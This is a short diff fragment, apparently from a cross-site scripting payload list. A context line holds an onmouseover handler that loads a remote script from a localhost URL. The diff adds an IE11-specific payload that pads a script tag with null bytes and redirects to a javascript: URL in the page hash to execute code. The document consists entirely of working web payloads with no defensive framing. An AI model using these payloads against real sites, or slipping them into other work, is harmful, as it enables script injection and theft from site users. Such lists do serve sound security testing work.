@@ -3,3 +3,7 @@
 
 
 <a onmouseover="eval(body.appendChild(document.createElement`script`).src='http://localhost:1234/a.js'"></a>
+
+
+IE11
+<script/%00%00v%00%00>document.location.href=location.hash.slice(1)</script>#javascript:alert(document.domain)
